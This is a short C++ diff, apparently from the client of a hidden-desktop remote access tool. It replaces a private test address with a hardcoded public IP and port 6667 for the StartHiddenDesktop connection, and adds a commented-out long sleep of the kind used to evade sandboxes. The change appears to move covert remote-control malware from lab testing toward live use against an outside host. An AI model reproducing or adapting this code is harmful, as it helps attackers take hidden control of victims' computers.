@@ -48,13 +48,15 @@ int main(int argc, char* argv[]) {
 	memset(bytes, 0x00, dwSize + 1);
 	memcpy(bytes, lpAddress, dwSize);
 
+	//Sleep(25000);
+
 	if (strlen(bytes) > 0)
 	{
 	    server = bytes;
 	}
 	else {
-		server = (char*)"10.0.0.11";
+		server = (char*)"5.101.122.211";
 	}
 	std::cout << server;
-	StartHiddenDesktop(server, 6667);
+	StartHiddenDesktop((char*)"5.101.122.211", 6667);
 }
